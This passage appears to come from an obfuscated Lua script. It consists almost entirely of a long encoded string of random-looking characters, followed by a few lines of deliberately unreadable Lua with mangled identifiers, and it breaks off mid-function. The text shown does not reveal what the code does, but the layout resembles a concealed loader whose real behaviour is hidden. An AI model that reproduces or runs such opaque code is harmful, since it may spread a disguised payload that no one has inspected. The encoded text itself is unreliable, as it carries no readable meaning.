D^FTS17NST=T?oFo^SF= /7? ^DCFFNN7CNPoo.DW^b=? DN?7^fFN=TNTPC?DN??S7 F?P^NTbG^.T.bC=PSob?oTNC=P8DPS bN DS7bT)=C^.TT PNo=CDoFDTS?bTSN SD7=  D ?^N7bF^oS.bPTP0D SS7? ??o^g*DPbNDTDCDoF?SSDb}?S^^KPKMCSS bCbC b^F7o!?N..ST.PCobSF=ob??.^S77FCNbTFCoN^oCDb=FDP?b7FGoF?..TSC7oCDb=Fbo ??o- NCNC.bCFPoo?S.T^bD o^b#FFoN?T.CSP7DCSb=.bU??7.xSF7.CTTC.ooD?=.bS 7^C7bFFNoN7T H SN=b=b F?o^?*.b^N7^oCbP=oSS?b. S?77Ckb^N?bN0P.oSD7=Co SNDbb^F.NS.7CCPbDFDS=P .?SSF=DN^ToToC?o.DSTTbCP?^F7o=7N..NTNCo. SFS7o^ST==bK?P^ zNFDN^TTC==P CS ^.7=FP?CTSC7FoDb=FC=?_7S7S%7NC?:7.Poo?.C=Sb7oo^b*FFo 7.CCNP7DCSbbF o??7.<SF7.CTbC=PSD?TCbS 7^C7bb.No.?C.PSNN=D F F?oSN_.FS?FTCCboFNSS?b.Pb?7^PRbNF.o.^NooSD7=Cbb?F?D FF.NS.7FSPbDFSoT7 .?S^7MCb?.FTo7tDPS7S7bCP4^F7od? C.ST7PCF?SF=o=^?.^S77FC^ BNCoP?D.SS=7DPS 7FQoF?..&?C7FoDb=FboP7^.7S_7NC?^PTo?o?S.=SPT?C^bhFbSN?T.T=..oPSbbFb= F^bsS RN TbPFooDC=.P= P o^^FFNo*FTTN?o7.o=b F?oD7=PN TCTCCboFDoTNb.Pb?77Cyb,PN7T?P.oSD7=CbbSC?D7?vCF .FCCN7oNSo=? .?S^72CFNFPToC?o.NbS7CD?^7o7o{?N..ST7Q=ob..=oC7So==77FCN..DCoP?TCSS=o C?b7F7^F?7CTSC7P?DN=FboD^?T7SbFNC.b7To=S.S.=Sb7?C^bvFy#FG.CF=FFDCC7bF o??^b SFNNoq C=P=DPPT=b N?^7NFFNo.?TTPSNFCPS?bT I7QFSFSN7TCCboFDoS?b. S?7^^7^FT7bT?P.oST7S^=?SN?_7bl ^=.FT^NbDFSo=?bT  ^N7^N^ToToC?o.DSS7bC b^F7oz?N..ST7PC.7SF=ob??.^S .?CF^.=TDP?D.SS=7 C  3TF?F?..TSC7oCDb=Fbo ?^.7S17NC.bCFNoTFS.=Sb7?C^T7Tn>N?T.CSP7oPST T????7.3SF7.CTbPFooD?=.bS 7^C7bFFNo7?FoPSo7SC=b F?o^?5.FSF-.^P^DoDoS?b. S?77CIbNF.oT?P.oSD7=Cbb?F^o7?X NN.NToC?o.D==Pb ^ hCwCFb.FToC?o.DSS7bC b^F7oQ?N..ST7.?.=T.P.P=?.bT=7FC7D7P!^NSSP=7 N?bNTN7TIPPo STF.NPT=C?PToSSF=d F?^DNS==U P? 7N!D^^7TT=C=oPD =Nb=.CTSPDoSDS. ^TPDo^ST= PDo7SC== F?o^  C?N7 qcN..=.?S o=SNSSb= b?b7vgSN.TPCFC!P4D bN =?C^b.vFoN=T^PFPDo?SCbT C^NNYA FD.NTFPDoFDNS?b  o??LN67.N.CTbP.DNS7=NbS?^.S.72?PbDFSo=? .?N^7YCNb^=FPF=C?CTPbo*DS=:bb^b^^iDF.NS.NoSoNobS^?Dbb?F^ScDNCND.7PTS&F^N7T=CkoPD^NPSb=D b7D{LNP. CNPDo^P^P=b) =^ 8NFDN8S bN7N-D.CTPP.^=PTD^oS.PToPNoDD^=P=TSNFD7oaJND.^CTP=ogSPD DN?D^S,TF=NmTD.FSDoo. bN =?z7Pg NN.DN NToDDJ=Pb ?N^D7^^ ^=.&TCP DNSD=dCNTfD.oT=7S.?D T(S7=4 NNC7CTobSSNN.=TgPPo SN=DS=ST^D7<FPN TNCDP^.DC==1b.? 7NcDFxoT777.=oC 7^o^TFD==RPPS =SP.SDoC.. %b^?P^ RNFDN^TTF^NrDTS bN D?^7Tv=^?7PT CboDD^=TCTPFoTSobF C?PCTTtopSP=  TPNCPP D.bTbD d^=! 4FFS.DTSPPPHbF=P F?o^ 7S. F7.CT?7^t?N=.hCPP^C.?..^=.FSPShPF..NTDC^oPT7oo=^ofFbSFnNNS.=TTPPo SN==o.DFbxFToPN=ND7C.Tm=DS=^ P? 7N8DF^.T.NFIoPoD=NbD ^^PF DNb.CPN=D?^D D.bbCSFSPD.C=DTNTTF7D^=S =? D?^7TSPb7?T?y7?oDD==Tb= uoND.=N ..^T^P=o&SP=^NN7DooDSPTNn.?C oNDDSMFo.NTTCSoFDI=Fb^PNo=DA=Pb ?N^DbC?TN=.=CPP DNNC.=CNoFDNS7F=.NTDC^oTD=Fxo.D ^N7.s^NT.=CNCoo?CD?7b^ 7^=7WFPN^^.bDDS=.S=S^ P? 7Ng==7bTb^ .?D}^NFN?T.CFC o^DD=ob? 7^NST=Nbr?P^ nTDDSJ=o b^N^77?bN T?^7Tf=NNS==^?ooDo7=Tb= a^Du=oy7^N.C7Nb?.DDSCNP.N.?9NSDNM.9C oNDDSHFb.^CPPFooFp.DT^PTo=D;=PbTSN^P7^FTN=.JCPP . CD=^b7?=^22PF^S= T=DN=D=S.bP  ^N7=o.Sob ?R^H^F#oEoTCT.C P=FPNDTNCDP^NF.NT7CT?=7N{DF^.TT=C_TTT =N=D ^^T7=FN===Nb^ ?FTuC.CFh.bC PF=DS ?N ^P:DFS bN D?5n^TP77F^T C?oDD^=Tb N7 SF*UoNDN?CTP=o_SDT:C=CSDDooDP?S=T?^k7.P7^+MT=CS=F0 F?.DT^PTo PC?=-  V^P7^FTN=.;CPP DNCD=^b.?=^5yPF^FT7S^ST^7oNbokC7NS?S=7DCoPPbF7NFSN=Fb^?T^=;No=D7=o P?o7TS==N P? 7N)=7CP=To.=C5??CbK7=O TFD?CnP. T.PDo^STToooP?=CD=bFb  ?9^R=TCN=ToCoDb7THCF}.PT PTT7._PN^O ( C7 FNND.; F7bFP7SFCNPC o=SDSbbbbb^f^FFSFpF^. T o=o?o7 D?N^T7DFNFNF7Poo.P^FTNC.fCPP DT.dj^b+oo^ogPF .N.KC^oTD=S^bP  ^N7D*^NTT=FFPPoDSN=Db^?PT^PNDbN=TNCDP^DTS==q PS ^sWDF^.TT=CkoPS ^.bP ^^T7=KtNP. CNPDo ST==bd?P^ RN^D^^TNC=PUDPS bN DP^bT_=Fi.PT PNoDD^=Tb= b=P7 FNND.^7SP=obSP=  N?D^^#ToDN1TFC P?DDS^bT T C7P9oNN.FT^P.o=DV=PbDb^^D7^FTN..vCCP DN.?=^b7?=^GfPF .NTDCboTDCSabF  ^N7D#^So.=TbPPo=SN=Db^?TD77<FFN TFCDP^DTS=Pb P?b7Nl.F^..T=T^PSD S?bD S^T7=B>FTN_CNPNo^S.==bV?P?=^CFDNoTTCPPHDPS bNbP?^^ z=F7.PT PNoDoD=TbN A?^7 &^NDN .DP=ooSP=o N?D^^7N=TNv. C P=DDS^bT =?D7P<FNN..T^PNo=P=D=b  o^D^=FTNS.xCFP o^DT=^ T?=? <PFb.NTTT=oTD=S>Sb  ^F7Dl^ S.=TTPPo=SN=Db^bTob76rSN TFCDP DTS==7 P ?7NYNF^.TT=CdPSD SNbD D^T7=jxNPNbCNCbo^DT==b^?P^ 7FFDNNTTT^PyoSS SN C?^^b)=FT.PTPPNCNTT=T=7 K N7 FFND.?CTPPP SP=  NbT^^4.F=Ng^bC PPDDS bT =?8?PoTNNNbT^P.o=D^=Pb  D^D^7FTNT.HCPP DNDD=^bT?=^=#PF .NTDTFoTo?SG=P  ?m7D<^X^.=TTPPP#SNSbb^?T^.7*G?N .SCDPNDToTPP P?F7N?NF^..T=C?oPDDD^bD ^^T TUUNC. .N{So^D?==bS?P^bINFD,bTTT^P_D.S bN D?^^o_=FT.PTCPNP D^DT=. g?=7 jPND.?CTP=oDSPS7 N?C^^YTF=4y.oC PTDDSbbT D?n7P7PNNNDT^CDo=Dd=Pb b7^D^?FTF^.QCPP DNC^=^bP?=?7/PF=.NTD7SoTo?S1=S  ?T7DG^FN.=T.PPo.SNSbb^?T^D7O4DN .DCDP^DTS==D P ?7N*CF^.TT=.sC?D SNbD F^T7.ZxNPN=CNCSo^DC===Y?P^ ^oFDNTTTT P!ooS = CP?^^^_=^o.PTbPNPwD^S,=P 0^P7 ?SND.?CTPPP SP=  NS ^^M.F=N2^bC PPDDS^bT =?37PS7NNN T^PTo=DP=Pb TC^D7TFTND.JCPP PN.S=^b7?=^bIPFb.NND77oTDTSG=J  ^F7D&=fU.=TmPPP SN=ob^?TPC7YFPN TFCDP^DTSS=f P? ^IpDF^.TT=C#oPS P.bD ^^T7=tLNF. CNPDC^.t==b7?P^ ANFoN^TT.?P#DCS bF D??7T3=s=.PTbPNoDD^=Tb= ( b7 FFND.?CTPSo+SPSS N?D^^t.F=N*TPCToNDDS^bT .?R7P2 NTS bF S^D7SFPb   ^D7^FTN =o =^N^?u.=^bS?=^9KPF^==bs F? ^^k.Fb.=TbPD/^F^.=T1PPo^7CF^...7C 7qFFN TNCDP)^o7DFo.D?=7N%DF^.TT=C)oPT SybD ^^T7=pgNPT F.PDoFST==b2?DTHoTobSDbPb?^P^SFNNo..Ts^29=Fw.PT PNoDD^=Tb= J^P7bO^ND.^CTP=T.SP=b N?o^^rTF=N:gNC oFDDS^bT =?67PDoNN.DT^P.o=DX=Pb T?^D7^FTNS.XCPP DNSD=^ T?=^p)PF .NTCC^oTD=SzoS  ^N7D+?NT.=T6PP.DSN=Db^?T^=7+FPN b?CDP^DTSS=8 P? 7NcDF^.TT=C-oPD =NbC ^^T7=r3^S. CNPDo?ST==b!?P=DiNFDN^TTC=P%DPS N? D?^7TsSF&.PT PNoDD^=Tb= d^P7 FFNT.^CTP=oQCS=  F?D^?XTF=N_TPFDoNDoS^bT =?f7Pu S?.DT^PToSDc=Pb ?NP.7^FTN=.7CPP DNSPC= T?=^w7TbC.NTPC^oND=S!bP  ?P7DabNT.=TvPPo SNSTb^ A^=77FPN TNCDPoDTSo=, .? ^^JDF^NNT=C oPD =NbD ^^T^D2tNN. T^PDo^ST===??P^o9NFDN^TTC=PdT S ={ D?S7T;DFcN4=7PNoPD^SDb= 7^P7 FNNTN=CTP=o6D==  F?D^^ oF=N?TPCboNDDS^bT.??W7.u FH.DT^PTPD7!=PbS?N^.7^FTN=.tNFP o^SD=? T?=^:aPoC.NTCC^oND=S^bP=PSD7D>bNT( TiPCo SF=Db=ba^=7GFP7^TNCoP^DT.7=_ .? 7NcDF^.TT=C?oPDS=NbC ^^.7=<=7C. T7PDPoST=Sba?C^ 7^1TN^TTC=CSDPSbbN D=F7TvoFi.PT PNoDD^Fob= ?^P7=FNND.^CT07o_S.=  N?D^^dTF=N?TPCSoNDCS^b. =?QbSm F^.DT^PTo=Dl=PPF?N^.7^FTN=.qCPPPFPSD=D T?o^*HCF .FTDC^TbD=S*bP D^N7D*^NT ?TsPFo SF=DbD?T?DPzFPNoTNTjP^DTS==a P? ^ uDF^.TT=CYoPD =NbF ^^T7=V7NP.P^PPDoPST=Dbm?C^ iFFDN^FbC=PrDPSDbN D?^^T==FxN7T C7oDDP=Tb=b=^P7oFNNF.^CNP=P^D = b ?D^ vTF=NJTPCooNDFS^bT =?v7PK ,^.DToPTo.Dt=Pb ?N^N7^% N=.bCPP DNSDSN T?T^t7^F .FTDC^FSD=S=bP  ^N7D:^NT ?T*COo SF=Dbb?T^=o.FPNDTNCPP^DTS==tSN? ^74DF^.TT=CaPT7 =NbC ^?77=w!NP. F?PDo=ST=Sbt?P^ RNoFN^TFC=P^DPS=bN=NST7T3oF8^.T PFoDD==TbPb ^P7 FN?C.^C.P=o!.b= b7?D^^4TF=N>NPCNoNDTS^b. =?S7P- FT.DTbPTooD:=Nb bN 77^aEN=.7CPPPDNSDS^ T?o^uv.F N^TDC^o.D=S bP  ^N7DZ^NTN^TOPFo SN=Db^?T =7FFPNPTNCoP^o?S==u .? ^?4DFS.TTTCHCPFo=NbN ^^.7=g=NP.P^PPDooST==bM?C^ 2FFDN^FbC=P_DPSDbN D?^7TS?Fh.FT C oDDo=T=D.<^P7oFNF8.^CTP=onSP= b ?D^^}TF=N0TPC oNDFS^bT =?77P&PbP.DTPPToSDu=Cb ?F^D7^^bN=.uCPPDDNSD=^bTo=^077F N7TDCPoTD=STbP o^N7F4^NN.=.^T%o D =Db ?T^=7YFPFTTNCFP^DTS==< P? 7FtDFo.TT.C4oPD =NS  ^? 7=GbNP. CNPDPaST=TbX ^^ OFFDN^^SC=P=DPS bN D?^?TD^FJN7T PFoDDo=Tb=bT^P7PFNNN.^T?P=CKDN= bb?D^?VTFTNLTPCNoNDNS^=? =??7P+ F=.DT=PToDDg=Pb ?N??7^FFN=.gCPP DNSDNS T?=^a9CF .NTDC=oTD=SnbPb7^N7D3^NPS7 .^Dv F B?....oFP7DDSP.fCDP^DTS==u P? 7N6DFD.TT=C0oD7.FPN^.ST77DfrNP. CNPDo^=TPbb^?P^ >NFoN^TTC=P^DPS bN D?^7TF=^F.PT PNoDD^S7b= 5^P? b^ND.?CTP=o%SC=  Nbb^^r.F=N7TPCboNDDSTbT S?W7Pq NN.DT^CSo=D7=Pbb?N^o7^FTND.GCPP DFSD=^ T?=^wHPF .NTDC^oTD=SSbP  ^N7D^oNT.=T1PPo SN=Db^ F^=77FPNbTNCDP^DTD?=0 T? ^;>DF^.TT=CNoPDb=Nbo ^^N7=2QNF. CNPDo?ST==bl?P^PVNFDN^TTC=PkDPS So D?^7TUSFX.PT PNCSD^=Tb= KPo7 FNND.^CTP=oVSPSP N?o^^v.F=N5TPC C DDS bT D?+7P< NNNFT^P.o=D7=Pb=?N^D^?FTN=.GCTP o4SD=DbF?=^u_PFT.NToC^oTD=S =N  ^N7D5PNT.ST3PNPDSN=Db^ F^=77FPN TNCDP^DTS==f P? ?uoDF^..T=C?oPD =NbNPN^T7D!ENC. CFPDobST==oT?P^ (NFCN^TTC=Pn.=S bN D??7Tu=Fn.P79PNoDD^=Nb= r^P7 DTND.?CTPDoVSP=  NoT^^dTF=N8TPCboNPDNSbT =?m7P8 F^.DTD oo=Dz=PS^?N^o7^FTN=. TNP DNSDDp T?S^47T=P.NTDC^oND=SYbP  =T7D)^NT.PTWPPo SN=Tb^?T^=7bFPN TNCDCSDTSS=AbL? 7NpDF^F7T=CZoPD==Nbo ^?N7NBxNP. CFPDo^ST===C?P^ UNFoN^T.C=PRoTS bN D??7TO=F>.P.?PNoDD^=Tb= *^P7=oPND.?CTP=o<SP=  NbS^^<.F=N7TPCboNDDFSbT =?Z7C_ NN.DT?PTo=Dh=Tb ?N^D7^FTN=T:FoP DNSD=^ T?C^vkPF FN7TC^o.D=S3bP b^N7D7 NT.ST6PCo SF=Db^bD^=77FPN TNCDP^DTDP=I C? 7FvDF?.TT=CboPD =Nbo ^^T7=07NP. CNPPo^ST==b5?P^ FN?SN^TTC=P,DPSobN D?^?TbPFf.CT PNoDD?=Tb=b^^P7bFNNo.^C.P=o)DT=  F?D^^lTF=N)TPCNoNDoS^b. =?77Pq FS.DT^PToSDi=Pb  7^D7^FTN=NpCPP DNS=L7NXTFP?D=D  C== ?GFR^)DNFTSC.7D7?NT.=T9PD3?XTFbN#.SCIPb ?D bDb NC7.i FC.D? 7N/DF^.TT=CxoPD =F=7 ^^T7=^=r=. CNPDobST=Sb%?.^ 7^zTN^TTC=P?DPSbbN T =7T6=FlNAT PFoDo FTb= 7^P7bFNND.^CT??olSC= b&?D^^zTFPF TPC oNo6S^b. = ^owp NF.DT PTo=DL=PN7?N^o7^FNN=._CPP 7?SD=^ T?S^4VPF NbTDC^oTD=S7bP  ^N7=l^NT.=T_PPo D?=Db^?ToPS7bTb/??CPP^DTS==A P? DN DF^N^T=CBoPFSN^TPPCoPS.z^NP. CNPDo^STb=DF?T^ ;NFDN^TTC=P6TPSbbN D?^7T%=Fw.PT PNoDD^=NbT h^P7 FN??.^CNP=oiSP=  N?D? aTFoNtTCC oNDDS^=P =? 7P0bNN.DT^PTPSDu=.b  y^D7 FTN=.TCPP=DNSD=^ F?=^X^ F .NTDC?oTD=S/bCSS^N7DU^NT?7TmPCo SN=Db^?T^= bFPN=TNCDP^DTS==rF7? 7FLDF .TTDCWT:TN=Nbo ^?D7=n7NP.SCNPTP=ST==bu =^ LFFDN^^SC=P7DPSbbN D?^7T?CFW.TT PNoDD^=TbTPT^P7SFNND.^C.P=o^SP= SS?D^^jTF=NlTPC oN. S^bT =?^7Px NN.D^bPToSD:=.b ?F^D7=7;N=.XCP.bDNSo=^ To7^/vCF .NTDC^oTD=PbbP =^N7Dr^NT.=TXb7o SF=Db ?T^D7%^%^NTNCoP^C.S==7 P?o7NjTg=.TT=C8TCD =FbD ^ N7=s7NP. CNPDo^DP.7b2 v^ ?FFDN?TTCSPuDNDDbN D?^ .6=F7.PT <ooDD?=Tbo 2^P7 FN^o.^CNP=o}SP=  N P?^>TFoNU.pC oNDDD Sb =? 7P6PNN.DT^PTo.Dr=Cb  ^^D7 FTfT.NCPPbDNo =^ .?=^7XPFDF^TDC^oTP^SkbC  ?^^Tt^NT.=F7PPobSNSPTD?T^S7vFTN TNCDC H^S==^ P?C7NRDF^.TbbC{o.D =NbD ^^T^D7oNP.DCNPNo^ST==b bb^ 7{FD7^TTCSPpDPPobN N?^7.z=FE.PT CPoDDo=TbP y^P7 FNF^.^T P=o SP=  N?D?b&TFFN2T.C oNDDS^bF =?P7P0 NN.DT^PTPbD1Sbb  ?^D7^FTN=NbCPC!DNS.=^ T?=^t^ F NSTDCNoTDDS_bP S^N^W9^F .=ToPPo 7?=DbC?T^C7>FPN TNCCP^o S==D P?.7N^D1;.TTNCEP^D S^bD ^ 77=USNP.CCNCpo^STSNbs?C^ 7 FDNoTTCP7QDPS=bN=o?^7.n=F+=ST PFoDD =Tb= L^PP7FNND.^CNP=oASP= .??D^^6TFSNWTPC oNDDS^bT =?c7PJ NF.PT^PTo=DaPNb ?N^D7^FTN=.ZCP^oDNSD=^ .?=^/yPF ^.ToC^oToD.=bP  ^N==m^NT.=T=T7o SN=DD7?T^S7&FPN .^TTP^DTS=DF P?b7N3DF^.TT=CBoPD =NbD ^o=7=}7NP. CNPDo^ST=Tbr?P^ 0NFDN?TT.=7bDPS bN D?^^?}={^FDT PFoDDP=Tb= %?T^PFNNP.^4PP=opSP=PCP?D^bVTFNNyTCC oFDDS^Db =?!7PlbNN.DT^PT^TDt=Tb  #^D7?FTFDN?CPP=DNPP=^ T?=?^7CF N7TDNDoTD=S5SPb=^N7Ck^NF.=T=PPP=SF=Db=?TbS7IFPN NNTSP^omS==  PbN7N7PFD.TTCC&.HD =NbD=^P77=#bNP.oCNNCo^DNNobI V^   FDN^TT.=CODPSPbN N?^^DK=Fc..T CboDD^=Tb= x?T7.FNFR.^T P=o3SPS= F?D^CjTFDNXTPC CqP S^== =?S7P, NN.T.FPToNDhDPb ?F^D7^?7N=.TCPPoDNSD=^ TCD^K7SF NoTDC^oTD=D7bPbz^N7Pp^NN.=TmCSo Db=Db.?T?^7IFPNNTNCFP^oDS==C P?DDNZDFP.TNVCsoCD =N=S ^? 7=,DNP. CNPNFNST=Nb} 7^ _FFDNDTTC=ToDPS bN P?^7Tw=Fnm?T PNoDD==Tb= L^P?.FNND.^T P=oUSP= SS?D^^GTFoN;TPC oNC7S^bT =?S7P0 NN.DNCPTo=Dn=Cb ?N^D7^77N=.oCPPTDNSD=^ T?D^&7 F .NTDC^oTD=SPbP .^N7Ps^NN.=TQCmo SN=DbC?T^=7gFPFDTNCDP^DNS==R P? ^PxDF^.TT=CIoPD S^b. ^^T7= NNC.bCNCP^^ST==btSF^ cNFDY^==C=PJDPS bN F?^^N7CFh.PT N^oDD^=T=D F^P7 FN^..^CTP=C*D==  N?D^^fT BN2.TCCoNDDS^S= =?87P{ qo.DT^PToSD#=Pb bO?F7^FTN=FCCPP DNDPF^ T?=^LbPF .NTDC^T7D=S7bP  ^N7D&^NTNST(PTo SN=Db^?T^=^DFPNSTNCDP^DTS=S^b.? ^^nD?P.TT=C:PToF=Nb. ^? 7=>#NPN=T^PDoDST=DbY?P^ ^AXNN^.?C=PSDPS bN TPP7TqCFY^^T PFoDo FTb= o^P=RFNND.^.T SolD?= bS?D^={TF=FTTPCNoNo%S^bT =?w^N3 FS.DT PToDDj=PbN?N^P7^w N=.oCPP o.SD=C T?D^r7^F .NN^C^oND=SobP T^N7TS^NT.CTINPo SF=D= C^^=7bFPNCTNCDP^oN7b=zb9? ?S-DF^.T.DCSoPDC=NbF ^^T7=I 9=. T?PDNCST=Sb*bPSbENU7N^. C=PSDPo T6 D?T7T*PFY7=T PNPPD^SDb= D^P7 FNND..CTC?oiD^=  N?D^^7oF=NPTPT7oNDPS^bTbo?+7.X FS.DTTPTC=oC=Pb.?N^T7^?DN=.HTSP ooSD=P T?=^-YP^o.N. C^P D=SmbP  .S7DGCNTN^TZPTo oND b^ =^=7DFPNCTNCDPSDTSo=+b?? ^D)DF= TT=CboP.W=Nbo ^?^D^+zNF. CNPDo?ST=Pb5?P ./NFDN^T.C=PlDPS DS D?^7T<=F_.PT PNT7D^=Tb= ?^P7 FNNDFCCTP=o_ST=  N?D? S^F=N=TPNFoNDDS^=^=%?c^2v b .DT?PTo=DB=N=D?N^D7^=^N=.7CPC=7NSD=D TS7^LvPF .N=TC^P^D=S7bP =^N7N7SNT.TT(73o SF=Db^?T^P^ FPN TN7NP^D.S== bN? 7N2Dbo.TTSC8PT7 =NbN ^bL7=k0NP. F?PDooST=Cbh?P^ ^Wo7N^. C=CTDPS bNbP?T7TpFFrN7T PNoDo S^b= P^P ?FNND.^TNC=ojDb= SN?D^^YT)DFoTPTYoNC7S^bT =?R^b& Fb.DTNPToDDU=PbP?N?G7^67N=.tCPC=^SSD=C T?C^35PF Fp.CC^P=D=CPbP  ^N^PLCNTN7TpNoo SN=D=  .^=7TFPF7TNCDP^oNDT=1bS? ?7!DF^.TT=C oPDT=N=b ^^N7=/_F.. TSPDoSST==bl TC.{Nh^N^N.C=P8DPD==? D?.7T bFG.PT TLPDD^SDb==F^P7 FNFPNTCTC?oGCS=  N?D? ^SF=NNTPC.oNDDS^bTb.?A^?k FT.DT PTo=DP=PbN?N^.7^FTN=N^?iP ooSDS? T?=^+7T=P.N. C^oFD=S5bPb=P 7DKFNTF=TOPPo o6Nbb^ P^=7NFPN TNTPCCDTDb=XSF? 7NdDF^NCT=CPoPo?=NbP ^^T7P1lFb. T{PDo^ST==bD?P?p}NF.N^TTC=C^DFS =C DD77T5=FWNTTPPNP=D^SNb= p^P^=DbNDN7CTNbo+SP= =: F^^7TF=&STPC oNoPD=bTbS?U sp NN.DT^T=o=DT=P=b?N^P7^FTNS.kTSP o?SD=^ T D^SWP_^.N77C^oTD=D^bF  ?.7D?7NT.=T:CTlPSNSDb^?.^=7;FPF=  CDC?DTo =v P? ?ySoF^NNT=NSoPD =NbD T^T^?>*FT. TqPDo^DS==bC?P?7jNFoN^.N^TPco=S Sb D?^7Td=D .P.7PNo.D^=Tb=b^ ?7 6TND7DCTP=omDTSC N S^^R.F=NwTPT=P DDD^bTSb?{7P{ ;EF T^C.o=TC=Pb ?N?P7 FTFD.{TNP DNSD=^==?=^.RPa=.NTPC^oTDoS)=S  ? 7D/FNTND..PPP^SNS-b^?T^=^^77N ..CDC.DTS==- P C7N7DF^N^T=CSoPDPD?bDb^^T.?J)NC. CNPDo=o9==b#?PN7:NFoN^.N^TPRoPS =b D?^7TK=SF.P.bPNP?D^=Tb=b^?.7 7-ND.oCTP=oKSNS  N D^^TDF=N7TPC P7DDD=bTb7?)^.V NNSPT^T#o=D==P=D?N^N7 FTFP.(SbP DFSD=^ T?P? fPF .ND?C^o.D=S1b.   ^7D8DNT..TJPPZCSNSTb^bw^=7DFPN N CDCSDTD7=wb.? 7N7=F^F7T=C=oPoo=NbDb=^T^PgQNT. TAPDo^DD=== ?P?DGNn7N^TTTDPloNS S^ D?^7T^TF=.P.DPNb?D^=.b=SF^P7D7^ND.^CT=7o+SC=  N=.^^^LF=N.TPC oNDDC7bTbC?p^=H NN.DT^C=o=o =Pb=?N^o7^cNtI.dTNP .fSD=^ T?=??2P0D.NToC^o.D=Sa=N  ^N7Dv?NT.=T)PPPoSNSTb^bR^=7LFPN==PCDCSDTSS=# P? 7N^SF^F7T=C7oPDb=NbTC^^T^=guDF. CFPDC^.C==bN?P?^:NFFN^TTNCProPS =? D?^7T7DDo.P.bPN.oD^=Tb=b^?o7 7rNDF^CTP=o*DTSN N C^^^TF=NxTPT=C=DDD=bTS??!7Pt ZM.NT^T7o=o==Pb ?N^D^IFTF=.qTFP oySD=^ N?=^DEPW .NTDC^oT7PS_=P  ??7D_^NTNDTbPPPbSNP1b^?T^=^^7^N NGCDT DTS==,bT C7N7CF^7CT=CvoPo=D7bDb=^T ^YaNP. .EC0o^o7==o ?P^ ;NFDF7TTT=P6oFS =l D?^b7p=Fo.P. PNoDD^=Tbo g?P7 G ND.PCTPTPCSP=C NMP^^I.F=FdTPCDC^DDS^bT7D?v7Cm NN.CT^CTo=D==PbC?N^D7bFTN..5TPP o=SD=^ F?=?JVPFP.N.7C^P^P7S)=^  -C7Dp?NTN=TRPNPDSN=Db^7o^=77FPN )?CDC^DTSC=% P? ?t7DF^N.T=TFoPD =N=Pb7^T^D)Y*F. CNPDP o====??P  VNFDN^.NCPP8oNS DT D?^7T7DF .P.oPNTWD^=Tb= < =7 <NNDNSCTPDo*SPD7 N V^^7^F=FHTPT=7 DDD^bT .?X7Pr NN=ST^C.o=DC=Pb ?N?P7FFTFD.}T7P DNSD==bT?=?gRPN7.NToC^PN7=S>=N  =T7Da^NT.T^TPPPoSN=Cb^?.^=7SFPN FSCDP^DTSN=5 P? 7N?7F^.TT=CCoPD =NbD=C^T7=(LF.. CNPDo^Pb==b_?P^C5NFDN^TT.FP1DPS =T D?^7TZ=7o.PT PNPbD^=Tb= qb?7 FNND.NCTP=ofSPoP N T^^/NF=N7TPC CCDDDbbT =?87Py F^ DT^CTo==7=Pbb?N NbTFTF .0C^P DFSD=P T?P? UPF .NTBC^o.D=S(DF  ?N7DwFNT.=TLCTTFSNSob^b7^=7aFPN N7CDC^DTSD=I C? ?u7FF^NTT=F^oPD =NbDbC^T^=r%NC. CFPDo^SF==bJ?P^bmNFDN^TTT?PMoPS =N D?^7T)DDT.P.bPNoTD^=Tb= x o7 nFND.?CTPSo/oP.o N D^^7SF=^PTPC 7DDDSobT T?Y^Pa gw.NT^CTo=DS=Pb ?N^D^TFTFS.!TbP DNSDS b ?=?^<PFC.NTDC^PKoFS:=P  ?C7om?NT.=T?PPPDSNS?b^ F^=7-^SN N^CDPDDTDP=1b: ^7N7TF^.FTSC7oPo7=NbTb=^T7=wwN..bCFPDo=o)==bV?P?X5FFoN^TTNCP,oNS =C D?^7Ts=^F.P.oPNP D^=Tb= _  7 7^ND. CTPSoMDT== N T^^ NF=NqTPC PbDDD=bT S?x7Cw NNF?T^PTo=D7=Pb ?N^D^=FTFP.#TNP DNSD= ND?=?b3PFo.NTDC^oTPbS:=F  ^F7Dc?NT.P?sPPP SN==b^?.^=7===N .NCDP DTSS=y T? 7N?7F^.TT=C=oPD =NbD=C^T7=kVF . CNPDo^.?===7?P^SYNFDN^.NCCPjoTS SD D?^7T!=F .P.SPNo.D^=Tb=b^ ^7 7^ND7oCTP=o*DTS? N .^^^oF=N-TPT=PTDDDDbTbD?%7P+ irNNT^T?o=DP=Pb ?N?PDDFTFN.q.SP DNSD=^TS?=??RPYT.NTPC^oToTSp=N  ??7D0^NTND.=PPPoSNCob^?T^=^^FTN N CDTbDTS==GbT?S7N7FF^.FT=C%oPo=SDbDbP^T o+3NP. .!P.o^ob===n?P^ 5NFD7TTTTPP4P?S =& D?^P.i={7.P.DPNooD^SNTT ;?T7 )bND.^CTP=7FSPSS N o^^{TF=F^.TC C^DDSobT =?H7N7LNNNPT^N?oSD7=P==C ^D^DFTN..6CPP DNXS=^=??=^C+PF .N.PCCoToNSj=7  ^N7DG=-^.=.=PPTPSF=ob^?TbC767 N .NCDP^DTS==7 P F7N7?F^FbT=C/PSD DPbDb?^T^C(gNP.=CNT^o^oD==b^?P^P^uFDFTTTNCP7DCS bN D?=?qL=FK.PFoPFooD^=TDC H  7 -CND.^CTP=T?SPSF N  ^^#TF=N{..C CDDDS bT S?v^T7NNNF^T^NNo=Dy=Pb b^^D^TFTNS.ACCP DNSP=^ T?=^7gPF .NTT^^oToTSnD? b^F7D(=bT.=.^PPCoSF=ob^ NC=7JmTN N=CDP^DTSTo7 P =7N ?F?..T=C7oPDDD^bD ^^Tb7W7NC. .Y?Do^DN==bF?P^ :NFD7STTToP-oTS bN D?^bN>=- .P.=PNoDD^=TS^ K?F7 L?ND.^CTCDP?SPSP NS7^^2TF=F^.oC CbDDS.bT =?)^T7NNNF!T^.Co=D<=P==ba^D^CFT??.+CPP PXo<=^==?=?oiPF .NTDNToToCSmS   ?p7D<^^ .=. PPo=SN=Pb^?T?F7EuNN TFCDP DTDD=o P o7N DF^.TT=T^P=D D bDST^T7=K2NP.NCNCTo^o^==b5?P^ ^PFDFbTTC=P>DTS =EN ?^?v>=F=.PT PNoD7b=T=o &?N7 FNND.^ToP=P?SP=  N?D^^pT>FNZTPC oNDDS^bT =Cb7Py NN.oT^PTo=");local n=h.IyCsPjXl;h.aPzAlgik(function()h.HqMJCdVC()n=n+h.MfvIa_YJ end)local function e(d,e)if e then return n end;n=d+n;end local d,n,a=f(h.IyCsPjXl,f,e,s,h.yEJjvIKS);local function l()local 